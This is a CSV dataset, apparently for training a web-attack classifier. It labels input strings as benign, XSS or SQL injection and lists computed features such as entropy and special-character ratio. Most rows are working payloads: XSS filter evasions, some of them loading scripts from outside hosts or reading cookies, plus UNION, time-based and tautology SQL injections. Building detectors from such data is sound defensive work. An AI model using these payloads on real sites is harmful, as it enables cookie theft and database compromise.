input,label,length,entropy,num_quotes,has_script,has_sql_keywords,special_char_ratio
";alert(String&#46;fromCharCode(88,83,83))//\';alert(String&#46;fromCharCode(88,83,83))//\"";alert(String&#46;fromCharCode(88,83,83))//\\"";alert(String&#46;fromCharCode(88,83,83))//--&gt;&lt;/SCRIPT&gt;\""&gt;'&gt;&lt;SCRIPT&gt;alert(String&#46;fromCharCode(88,83,83))&lt;/SCRIPT&gt;",1,280,4.823090447399575,5,0,0,0.3178571417219388
"<div style=""font-family:'foo&#10;;color:red;';"">XXX",1,51,4.65528214626704,4,0,0,0.3137254840445984
<video/poster/onerror=alert()>,1,30,3.8532359131272917,0,0,0,0.2333333255555558
"<;SCRIPT a=`>;` SRC="";http://ha.ckers.org/xss.js"";>;<;/SCRIPT>;",1,63,4.653058939924986,2,0,0,0.41269840614764436
new user registration,0,21,3.463280517810811,0,0,0,0.0
<IMG SRC=”javascript:alert(‘XSS’)”,1,34,4.6312929881819,0,0,0,0.2647058745674743
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14#",2,92,4.634788072618501,2,0,1,0.2934782576795842
"<SCRIPT a="">"" SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",1,56,4.597097109364437,4,0,0,0.33928570822704096
"<svg xmlns=""#""><script>alert(1)</script></svg>",1,46,4.368792054344758,2,1,0,0.34782607939508525
"<;IMG SRC="";livescript:[code]"";>;",1,33,4.559545634509969,2,0,0,0.36363635261708027
"<IMG SRC=x ondragenter=""alert(String.fromCharCode(88,83,83))"">",1,62,4.739934818207129,2,0,0,0.20967741597294492
"<IMG """"""><SCRIPT>alert(""XSS"")</SCRIPT>"">",1,40,4.0964393446710154,6,1,0,0.39999999000000025
"<div/onmouseover='alert(1)'> style=""x:"">",1,40,4.553055907333276,4,0,0,0.3249999918750002
leave a comment,0,15,3.1898980954642875,0,0,0,0.0
<svg><script x:href='https://dl.dropbox.com/u/13018058/js.js' {Opera},1,69,4.95658324728014,2,0,0,0.26086956143667306
"<?='<SCRIPT>alert(""XSS"")</SCRIPT>'?>",1,36,4.239097917988786,4,1,0,0.44444443209876583
reset your password,0,19,3.431623565847431,0,0,0,0.0
"<HEAD><META HTTP-EQUIV=""CONTENT-TYPE"" CONTENT=""text/html; charset=UTF-7""> </HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-",1,127,5.13504823667667,6,0,0,0.2598425176390353
"<? echo('<SCR)';echo('IPT>alert(""XSS"")</SCRIPT>'); ?>",1,53,4.524629180774193,6,0,0,0.43396225596297633
"<META HTTP-EQUIV=""Set-Cookie"" Content=""USERID=<SCRIPT>alert('XSS')</SCRIPT>"">",1,77,4.832973190124667,6,1,0,0.25974025636700965
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14#",2,50,3.8985166738834374,0,0,1,0.2799999944000001
"<style></style\x0D<img src=""about:blank"" onerror=javascript:alert(1)//></style>",1,79,4.737669679659489,2,0,0,0.2531645537574107
"><img src=x onerror=window.open('https://www.google.com/');>
<form><button formaction=javascript&colon;alert(1)>CLICKME
<math><a xlink:href=//jsfiddle.net/t846h/"">click",1,168,5.15372713076636,3,0,0,0.22619047484410432
"<OBJECT TYPE=""text/x-scriptlet"" DATA=""http://hacker.com/xss.html"">",1,66,4.799230339549604,4,0,0,0.2424242387511479
"<HTML xmlns:xss><?import namespace=""xss"" implementation=""%(htc)s""><xss:xss>XSS</xss:xss></HTML>"""""",""XML namespace.""),(""""""<XML ID=""xss""><I><B>&lt;IMG SRC=""javas<!-- -->cript:javascript:alert(1)""&gt;</B></I></XML><SPAN DATASRC=""#xss"" DATAFLD=""B"" DATAFORMATAS=""HTML""></SPAN>",1,271,5.240278897153742,22,0,0,0.3284132829209842
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11#",2,41,4.02269698136929,0,0,1,0.26829267638310544
&lt;BODY ONLOAD=alert(&apos;XSS&apos;)&gt;,1,42,4.386015934528989,0,0,0,0.2619047556689344
"<html onmousemove html onmousemove=""javascript:javascript:alert(1)""></html onmousemove>",1,87,4.396180496806704,2,0,0,0.13793103289734446
<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;,1,105,3.5126746022481568,0,0,0,0.5047618999546486
"<IMG SRC=x onafterprint=""alert(String.fromCharCode(88,83,83))"">",1,63,4.7822924232595305,2,0,0,0.20634920307382218
"<div id=""x"">XXX</div> <style>  #x{font-family:foo[bar;color:green;}  #y];color:red;{}  </style>",1,95,4.806698177948132,2,0,0,0.3052631546814405
X<x style=`behavior:url(#default#time2)` onbegin=`javascript:alert(1)` >,1,72,4.8159813423400335,0,0,0,0.2222222191358025
"<IMG SRC=javascript:alert(""XSS"")>",1,33,4.574400937409153,2,0,0,0.2424242350780535
<iframe srcdoc='&lt;body onload=prompt&lpar;1&rpar;&gt;'>,1,57,4.370011453019932,2,0,0,0.24561403077870123
<style/onload=prompt&#40;'&#88;&#83;&#83;'&#41;,1,47,4.286848236242022,2,0,0,0.4255319058397467
upload profile picture,0,22,3.6069367321753214,0,0,0,0.0
hello world,0,11,2.8453509366224368,0,0,0,0.0
"<object data=data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+></object>",1,73,5.018238429628915,0,0,0,0.1506849294426722
"<A HREF=""htt p://6 6.000146.0x7.147/"">XSS</A>",1,45,4.419305040629888,2,0,0,0.3333333259259261
"<body onUnload body onUnload=""javascript:javascript:alert(1)""></body onUnload>",1,78,4.447923853061582,2,0,0,0.1538461518737673
"<a href=""javascript\x09:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1,71,4.710580788978146,4,0,0,0.22535210950208298
<!--[if]><script>javascript:alert(1)</script -->,1,48,4.323934896284055,0,1,0,0.35416665928819463
"&lt;DIV STYLE=\""background-image&#58;\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028&#46;1027\0058&#46;1053\0053\0027\0029'\0029\""&gt;",1,193,4.1189008492023875,4,0,0,0.24352331480039732
"<embed code=""http://businessinfo.co.uk/labs/xss/xss.swf"" allowscriptaccess=always>",1,82,4.500006690662,2,0,0,0.18292682703747773
"UNION ALL SELECT 1,2,3,4,5,6,7,8",2,32,3.963710641914682,0,0,1,0.21874999316406274
reset your password,0,19,3.431623565847431,0,0,0,0.0
UNION ALL SELECT 'INJ'||'ECT'||'XXX'--,2,38,3.7930798156766308,6,0,1,0.31578946537396146
<title onpropertychange=javascript:alert(1)></title><title title=>,1,66,4.20819448731637,0,0,0,0.18181817906336092
&lt;HTML&gt;&lt;BODY&gt;,1,24,3.418295834054489,0,0,0,0.333333319444445
<img src=`xx:xx`onerror=alert(1)>,1,33,4.207738347405823,0,0,0,0.2727272644628102
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27",2,88,3.599714467186648,0,0,1,0.2954545420971075
"<IMG SRC=x onpagehide=""alert(String.fromCharCode(88,83,83))"">",1,61,4.844431394833535,2,0,0,0.21311475060467622
ORDER BY 2#,2,11,3.095795255000934,0,0,0,0.09090908264462885
sleep(5)#,2,9,2.94770277922009,0,0,0,0.33333329629630043
"<marquee onStart marquee onStart=""javascript:javascript:alert(1)""></marquee onStart>",1,84,4.353112573988809,2,0,0,0.1428571411564626
"<body onPageHide body onPageHide=""javascript:javascript:alert(1)""></body onPageHide>",1,84,4.602796292364455,2,0,0,0.1428571411564626
<iframe src=javascript&colon;alert&lpar;document&period;location&rpar;>,1,71,4.212764197880309,0,0,0,0.15492957528268203
"<! foo=""><script>javascript:alert(1)</script>"">",1,47,4.351837255656769,2,1,0,0.31914892937981004
"&lt;META HTTP-EQUIV=\""Set-Cookie\"" Content=\""USERID=&lt;SCRIPT&gt;alert('XSS')&lt;/SCRIPT&gt;\""&gt;",1,99,4.832512464026356,6,0,0,0.3030302999693909
&lt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;);//&lt;&lt;/SCRIPT&gt;,1,62,3.963499890990715,0,0,0,0.35483870395421446
"<STYLE>BODY{-moz-binding:url(""http://ha.ckers.org/xssmoz.xml#xss"")}</STYLE>",1,75,5.160299150663646,2,0,0,0.2933333294222223
"><h1><IFRAME width=""420"" height=""315"" frameborder=""0"" onmouseover=""document.location.href='https://www.youtube.com/channel/UC9Qa_gXarSmObPX3ooIQZr",1,146,5.286453086004389,8,0,0,0.18493150558266092
"<iframe style=""position:absolute;top:0;left:0;width:100%;height:100%"" onmouseover=""prompt(1)"">",1,94,4.680599724885923,4,0,0,0.22340425294250796
<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>,1,217,2.684029874415209,0,0,0,0.22580645057232052
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14#",2,75,4.389165312204367,2,0,0,0.30666666257777786
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12#",2,86,4.618800401257632,2,0,1,0.29069767103839916
 ,2,1,-0.0,0,0,0,0.0
<<SCRIPT>alert(“XSS”);//<</SCRIPT>,1,34,4.124083797069061,0,1,0,0.41176469377162667
"<a href=""\xE2\x80\x83javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1,79,4.864659425750382,4,0,0,0.22784809838166964
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)))--",2,68,4.391397916436687,0,0,1,0.23529411418685128
"<BR SIZE=""&{alert('XSS')}"">",1,27,4.430632409490747,4,0,0,0.44444442798353967
"`""'><img src=xxx:x \x0Conerror=javascript:alert(1)>",1,51,4.65528214626704,2,0,0,0.2549019557862362
"<script charset=""\x22>javascript:alert(1)</script>",1,50,4.349275070710713,1,0,0,0.2199999956000001
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))#",2,85,4.249698880510161,0,0,1,0.2470588206228374
welcome to the site,0,19,3.221097250057957,0,0,0,0.0
<a onmouseover=alert(document.cookie)>xxs link</a>,1,50,4.391272380112911,0,0,0,0.17999999640000008
"<img src=""javascript:document.vulnerable=true;"">",1,48,4.5220552088742005,2,0,0,0.1874999960937501
&#X003C;,1,8,2.75,0,0,0,0.3749999531250059
"<SCRIPT/SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",1,50,4.511272380112911,2,0,0,0.31999999360000014
"<img src=""javascript:document.vulnerable=true;"">",1,48,4.5220552088742005,2,0,0,0.1874999960937501
"<script\x2Ftype=""text/javascript"">javascript:alert(1);</script>",1,63,4.364838511984457,2,0,0,0.22222221869488543
"<iframe/src=""data:text/html,<svg &#111;&#110;load=alert(1)>"">",1,61,4.701332116912215,2,0,0,0.3278688470841173
"<body onResize body onResize=""javascript:javascript:alert(1)""></body onResize>",1,78,4.592719130409065,2,0,0,0.1538461518737673
"benchmark(50000000,MD5(1))--",2,28,3.8198019058289177,0,0,0,0.24999999107142887
"<a href=""\x1Ejavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1,71,4.671779556553309,4,0,0,0.22535210950208298
"<svg onunload svg onunload=""javascript:javascript:alert(1)""></svg onunload>",1,75,4.44197511091795,2,0,0,0.1599999978666667
"<BODY BACKGROUND=""javascript:alert('XSS')"">",1,43,4.943592952326203,4,0,0,0.23255813412655504
admin'or 1=1 or ''=',2,20,3.284183719779189,4,0,1,0.29999998500000075
"<html onMouseLeave html onMouseLeave=""javascript:javascript:alert(1)""></html onMouseLeave>",1,90,4.528049491645837,2,0,0,0.13333333185185187
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))--",2,77,4.33129539164297,0,0,1,0.24675324354865918
<video poster=javascript:javascript:alert(1)//,1,46,4.189125478116705,0,0,0,0.17391303969754263
"<a onmouseover=""alert(document.cookie)"">xxs link</a>",1,52,4.457570670389348,2,0,0,0.21153845747041428
"or SLEEP(5)=""",2,13,3.546593564294939,1,0,0,0.3076922840236705
AND 7300=7300 AND 'pKlZ'='pKlY,2,30,3.723231428797621,3,0,0,0.16666666111111128
<%<!--'%><script>alert(1);</script -->,1,38,4.188331131693838,1,1,0,0.49999998684210567
<!--[if<img src=x onerror=javascript:alert(1)//]> -->,1,53,4.675572577000608,0,0,0,0.33962263510145974
);waitfor delay '0:0:5'--,2,25,4.163856189774725,2,0,0,0.3199999872000005
" or ""&",2,6,2.2516291673878226,1,0,0,0.33333327777778704
"`'><script>\x21javascript:alert(1)</script>
`'><script>\xE2\x80\x82javascript:alert(1)</script>",1,95,4.500714292222647,2,1,0,0.2736842076454294
"<;IFRAME SRC="";javascript:alert(';XSS';);"";>;<;/IFRAME>;",1,56,4.650319430638476,4,0,0,0.3928571358418369
"<frameset onFocus frameset onFocus=""javascript:javascript:alert(1)""></frameset onFocus>",1,87,4.447944789496565,2,0,0,0.13793103289734446
<a href=java&#1&#2&#3&#4&#5&#6&#7&#8&#11&#12script:javascript:alert(1)>XXX</a>,1,78,4.526306554363348,0,0,0,0.3846153796844182
Redirect 302 /a.jpg http://victimsite.com/admin.asp&deleteuser,1,62,4.425002762798573,0,0,0,0.14516128798126957
"<a href=""javas\x0Bcript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1,71,4.710580788978146,4,0,0,0.22535210950208298
&#x00003c;,1,10,2.5219280948873624,0,0,0,0.299999970000003
"<IMG SRC=x onwaiting=""alert(String.fromCharCode(88,83,83))"">",1,60,4.831401845392172,2,0,0,0.21666666305555562
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21--",2,90,4.172493936090282,6,0,1,0.35555555160493835
payment successful,0,18,3.5724312513221195,0,0,0,0.0
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28#",2,117,4.145095424532031,2,0,0,0.31623931353641616
<? echo('<SCR)';echo('IPT>document.vulnerable=true</SCRIPT>'); ?>,1,65,4.8026106974108504,4,0,0,0.32307691810650896
AND 7506=9091 AND (5913=5913,2,28,3.5836169753972325,0,0,0,0.10714285331632667
"ABC<div style=""x:\xE2\x80\x82expression(javascript:alert(1)"">DEF",1,64,4.915873781480403,2,0,0,0.20312499682617194
update account settings,0,23,3.5670402169265785,0,0,1,0.0
&lt;IMG SRC=JaVaScRiPt&#058;alert('XSS')&gt;,1,44,4.6352347434897885,2,0,0,0.27272726652892576
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26",2,103,4.039519961885221,6,0,1,0.3398058219436328
&#x3c,1,5,2.321928094887362,0,0,0,0.399999920000016
"perl -e 'print \""&lt;SCR\0IPT&gt;alert(\\""XSS\\"")&lt;/SCR\0IPT&gt;\"";' &gt; out",1,79,4.519050134763294,6,0,0,0.3670886029482455
"<;XML ID=I>;<;X>;<;C>;<;![CDATA[<;IMG SRC="";javas]]>;<;![CDATA[cript:alert(';XSS';);"";>;]]>;",1,92,4.62920482757085,4,0,0,0.5217391247637052
<STYLE>@import'%(css)s';</STYLE>,1,32,4.351409765557392,2,0,0,0.3749999882812504
"><h1><IFRAME SRC=javascript:alert('XSS');""></IFRAME>"">123</h1>",1,62,4.913400745661377,4,0,0,0.33870967195629564
"<a href=""\x08javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1,71,4.710580788978146,4,0,0,0.22535210950208298
<svg contentScriptType=text/vbs><script>MsgBox+1,1,48,4.422995052579128,0,1,0,0.14583333029513895
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25",2,82,3.620374213435887,0,0,1,0.29268292325996437
"&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt;",1,65,4.6104533897851105,0,0,0,0.24615384236686397
"<TABLE BACKGROUND=""javascript:alert('XSS')"">",1,44,5.033184175406309,4,0,0,0.22727272210743815
"<meta http-equiv=""refresh"" content=""0;javascript&colon;alert(1)""/>",1,66,4.659152877461172,4,0,0,0.22727272382920116
<div onmouseover='alert&lpar;1&rpar;'>DIV</div>,1,47,4.519925224377835,2,0,0,0.25531914350384805
update account settings,0,23,3.5670402169265785,0,0,1,0.0
"<STYLE>.XSS{background-image:url(""javascript:javascript:alert(1)"");}</STYLE><A CLASS=XSS></A>",1,93,5.122057198830388,2,0,0,0.26881720141056775
"<script\x20type=""text/javascript"">javascript:alert(1);</script>",1,63,4.364838511984457,2,0,0,0.22222221869488543
"<a href=""\x19javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1,71,4.671779556553309,4,0,0,0.22535210950208298
"<img src=""mocha:document.vulnerable=true;"">",1,43,4.472321731245031,2,0,0,0.20930232071389954
<script\x00>javascript:alert(1)</script>,1,40,4.177567157116929,0,0,0,0.22499999437500015
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13#",2,47,3.9367356598200254,0,0,1,0.2765957387958354
"<STYLE>@im\port'\ja\vasc\ript:alert(""XSS"")';</STYLE>",1,52,4.733811593016276,4,0,0,0.34615383949704154
"&lt;FRAMESET&gt;&lt;FRAME SRC=\""javascript&#058;alert('XSS');\""&gt;&lt;/FRAMESET&gt;",1,84,4.717969769039543,4,0,0,0.3095238058390023
"<IMG DYNSRC=""javascript:alert('XSS')"">",1,38,4.78714396069814,4,0,0,0.26315788781163457
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13",2,71,4.369067749739971,2,0,0,0.2957746437214839
<--`<img/src=` onerror=alert(1)> --!>,1,37,4.301084704157685,0,0,0,0.4324324207450697
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26",2,127,4.424768356428462,2,0,1,0.29921259606919215
%' AND 8310=8310 AND '%'=',2,26,3.3927474104487847,4,0,0,0.30769229585798863
&LT,1,3,1.584962500721156,0,0,0,0.33333322222225925
"<DIV STYLE=""width: expression(alert('XSS'));"">",1,46,4.925523369006427,4,0,0,0.28260868950850676
&lt;OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389&gt;&lt;param name=url value=javascript:alert(&apos;XSS&apos;)&gt;&lt;/OBJECT&gt;,1,142,5.156558256990607,0,0,0,0.19718309720293595
&#34;&#62;<svg><style>{-o-link-source&colon;'<body/onload=confirm(1)>',1,70,4.882365695300048,2,0,0,0.34285713795918377
"<a href=""\x07javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1,71,4.710580788978146,4,0,0,0.22535210950208298
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29",2,94,3.5799999366909083,0,0,1,0.2978723372566773
"<script\x0Ctype=""text/javascript"">javascript:alert(1);</script>",1,63,4.364838511984457,2,0,0,0.22222221869488543
"<script\x0Dtype=""text/javascript"">javascript:alert(1);</script>",1,63,4.364838511984457,2,0,0,0.22222221869488543
"<FRAMESET><FRAME SRC=""javascript:alert('XSS');""></FRAMESET>",1,59,4.700463287296512,4,0,0,0.2711864360815858
ORDER BY 30,2,11,3.095795255000934,0,0,0,0.0
"UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",2,172,3.659830982435251,2,0,1,0.22093023127366146
">/KinG-InFeT.NeT/><script>alert(document.cookie)</script>
src=http://www.site.com/XSS.js""></script>",1,99,4.76242720208488,1,1,0,0.27272726997245184
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10",2,79,4.581856382835242,2,0,1,0.27848100913315177
"&lt;IMG SRC=javascript:alert(String.fromCharCode(88,83,83))&gt;",1,63,4.8983248687215495,0,0,0,0.20634920307382218
hello world,0,11,2.8453509366224368,0,0,0,0.0
&lt;scrscriptipt&gt;alert(1)&lt;/scrscriptipt&gt;,1,49,3.67810059942988,0,0,0,0.22448979133694305
view product details,0,20,3.8219280948873626,0,0,0,0.0
submit your feedback,0,20,3.9219280948873627,0,0,0,0.0
"<XML ID=""xss""><I><B><IMG SRC=""javas<!-- -->cript:document.vulnerable=true""></B></I></XML><SPAN DATASRC=""#xss"" DATAFLD=""B"" DATAFORMATAS=""HTML""></span>",1,149,5.1381300016106595,10,0,0,0.32214764884464664
"admin"" or ""1""=""1",2,16,3.25,4,0,0,0.3124999804687512
"<;XML SRC="";http://ha.ckers.org/xsstest.xml""; ID=I>;<;/XML>;",1,60,4.735812887167012,2,0,0,0.3666666605555557
&lt;STYLE TYPE=&quot;text/javascript&quot;&gt;alert(&apos;XSS&apos;);&lt;/STYLE&gt;,1,83,4.496875919909912,0,0,0,0.2650602377703586
"[color=red' onmouseover=""alert('xss')""]mouse over[/color]",1,57,4.165194399674187,5,0,0,0.24561403077870123
;waitfor delay '0:0:5'--,2,24,4.084962500721156,2,0,0,0.2916666545138894
*,2,1,-0.0,0,0,0,0.9999990000010001
"<;A HREF="";javascript:document.location=';http://www.google.com/';"";>;XSS<;/A>;",1,79,4.893855710389076,4,0,0,0.34177214757250446
"<script a="">'>"" SRC=""http://www.securitycompass.com/xss.js""></script>",1,69,4.510860240002408,5,0,0,0.3043478216761185
ORDER BY SLEEP(5),2,17,3.572469458770135,0,0,0,0.11764705190311459
"&lt;TABLE BACKGROUND=\""javascript&#058;alert('XSS')\""&gt;",1,57,5.161580145629823,4,0,0,0.28070174946137283
"<input/onmouseover=""javaSCRIPT&colon;confirm&lpar;1&rpar;""",1,58,4.59273827124388,2,0,0,0.1896551691438764
"<embed src=""http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf"">",1,94,4.80747170444819,2,0,0,0.234042550701675
"or benchmark(50000000,MD5(1))--",2,31,3.9976968118577387,0,0,0,0.22580644432882438
"<form><button formaction=""javascript:javascript:alert(1)"">X",1,59,4.490457193642899,2,0,0,0.18644067480609028
<IMGSRC=&#106;&#97;&#118;&#97;&<WBR>#115;&#99;&#114;&#105;&#112;&<WBR>#116;&#58;&#97;&#108;&#101;&<WBR>#114;&#116;&#40;&#39;&#88;&#83<WBR>;&#83;&#39;&#41>,1,154,3.860058613425846,0,0,0,0.5129870096559285
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)))#",2,160,4.338682264231983,0,0,1,0.2812499982421875
"<a href=""\x0Cjavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1,71,4.710580788978146,4,0,0,0.22535210950208298
ORDER BY 17--,2,13,3.238901256602631,0,0,0,0.15384614201183525
" or benchmark(10000000,MD5(1))#",2,31,3.9976968118577387,0,0,0,0.19354838085327802
"<body BACKGROUND=""javascript:document.vulnerable=true;"">",1,56,5.003434386188784,2,0,0,0.16071428284438782
&lt;SCRIPT&gt;a=/XSS/,1,21,3.7849418274376427,0,0,0,0.3333333174603182
"<a href=""\x12javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1,71,4.671779556553309,4,0,0,0.22535210950208298
<sVg><scRipt %00>alert&lpar;1&rpar; {Opera},1,43,4.319063813436125,0,0,0,0.25581394753921055
 or sleep(5)=',2,14,3.521640636343318,1,0,0,0.2857142653061239
payment successful,0,18,3.5724312513221195,0,0,0,0.0
"<XSS STYLE=""xss:expression(alert('XSS'))"">",1,42,4.478876280478754,4,0,0,0.2857142789115648
%253cscript%253ealert(1)%253c/script%253e,1,41,3.8876821873866105,0,0,0,0.1707317031528853
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13#",2,89,4.628225169693425,2,0,1,0.29213482817826036
"<DIV STYLE=""width: expression(alert('XSS'));"">",1,46,4.925523369006427,4,0,0,0.28260868950850676
"<INPUT TYPE=""IMAGE"" SRC=""javascript:alert('XSS');"">",1,51,4.976155243847438,6,0,0,0.2745097985390236
"<head><META HTTP-EQUIV=""CONTENT-TYPE"" CONTENT=""text/html; charset=UTF-7""> </HEAD>+ADw-SCRIPT+AD4-document.vulnerable=true;+ADw-/SCRIPT+AD4-",1,139,5.260742009984619,4,0,0,0.22302158112934115
thank you for your order,0,24,3.418295834054489,0,0,0,0.0
read the documentation,0,22,3.572623663895164,0,0,0,0.0
<;IMG SRC=JaVaScRiPt:alert(';XSS';)>;,1,37,4.486348298002911,2,0,0,0.3243243155588023
"&apos;;alert(String.fromCharCode(88,83,83))//\&apos;;alert(String.fromCharCode(88,83,83))//&quot;;alert(String.fromCharCode(88,83,83))//\&quot;;alert(String.fromCharCode(88,83,83))//--&gt;&lt;/SCRIPT&gt;&quot;&gt;&apos;&gt;&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt;",1,288,4.769973436847323,0,0,0,0.2881944434437693
<iframe src=http://ha.ckers.org/scriptlet.html <,1,48,4.215199876515856,0,0,0,0.20833332899305565
"<IMG SRC=x onmessage=""alert(String.fromCharCode(88,83,83))"">",1,60,4.835812887167012,2,0,0,0.21666666305555562
<body oninput=javascript:alert(1)><input autofocus>,1,51,4.459203714894491,0,0,0,0.1568627420222992
&lt;SCRIPT a=`&gt;` SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;,1,81,4.616310108654938,0,0,0,0.32098765035817717
"<html onMouseLeave html onMouseLeave=""javascript:javascript:alert(1)""></html onMouseLeave>",1,90,4.528049491645837,2,0,0,0.13333333185185187
"<IMG SRC=""livescript:[code]"">",1,29,4.582118926162055,2,0,0,0.27586205945303244
"ABC<div style=""x:\x0Cexpression(javascript:alert(1)"">DEF",1,56,4.847097109364437,2,0,0,0.19642856792091845
"/><img/onerror=\x22javascript:alert(1)\x22src=xxx:x />
/><img/onerror=\x09javascript:alert(1)\x09src=xxx:x />",1,109,4.630031572245168,0,0,0,0.2568807315882502
<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>,1,217,2.684029874415209,0,0,0,0.22580645057232052
"<XSS STYLE=""xss:expression(document.vulnerable=true)"">",1,54,4.745085187108268,2,0,0,0.18518518175583
"<IMG LOWSRC=""javascript:javascript:alert(1)"">",1,45,4.666977196801592,2,0,0,0.19999999555555567
view product details,0,20,3.8219280948873626,0,0,0,0.0
"<DIV STYLE=""background-image: url(&#1;javascript:alert('XSS'))"">",1,64,5.21305425036562,4,0,0,0.26562499584960947
";';;!--"";<;XSS>;=&;{()}",1,23,3.4952365449960032,2,0,0,0.8695651795841226
